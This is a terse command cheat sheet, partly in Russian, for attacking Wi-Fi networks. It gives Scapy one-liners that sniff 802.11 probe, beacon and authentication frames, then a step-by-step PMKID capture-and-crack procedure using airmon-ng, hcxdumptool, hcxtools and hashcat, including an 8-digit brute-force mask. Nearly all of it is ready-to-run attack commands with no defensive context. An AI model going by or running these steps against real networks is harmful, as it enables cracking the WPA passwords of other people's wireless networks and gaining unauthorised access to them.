sniff(iface='wlan0mon', prn=lambda x: x.show(), lfilter=lambda z: z.haslayer(Dot11ProbeReq), store=0)

sniff(iface='wlan1', prn=lambda x: (x.info, x.addr1, x.addr2, x.addr3, x.addr4), lfilter=lambda z: z.haslayer(Dot11Beacon))
sniff(iface='wlan1', prn=lambda x: x.info, lfilter=lambda z: z.haslayer(Dot11ProbeResp))
sniff(iface='wlan1', prn=lambda x: x.info, lfilter=lambda z: z.haslayer(Dot11ProbeReq))
sniff(iface='wlan1', prn=lambda x: x.show(), lfilter=lambda z: z.haslayer(Dot11Auth))

___________________________________

  PMKID

смотрим беспроводной интерфейс и переводим его в режим монитора

# iwconfig

# airmon-ng check kill

# airmon-ng start wlan0

------>>>>  Для атаки потребуются следующие инструменты: hcxdumptool, hcxtools, hashcat

Запускаем hcxdumptool для "снятия" PMKID

# hcxdumptool -o test.pcap -i mon1 --enable_status=2

После чего необходимо сконвертировать полученные данные:

# hcxpcaptool -z test.16800 test.pcap

Далее остается "скормить" полученные результаты утилите hashcat (да, без брута пока никуда) и ждать результат:

# hashcat -m 16800 test.16800 -a 3 -w 3 '?d?d?d?d?d?d?d?d' --force
___________________________________

hcxdumptool > 4.2 version
# git clone https://github.com/ZerBea/hcxdumptool
# cd hcxdumptool
# ./hcxdumptool  -i wlan1 -w dumpfile.pcap

# hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
# hashcat -m 22000 hash.hc22000 wordlist.txt
___________________________________
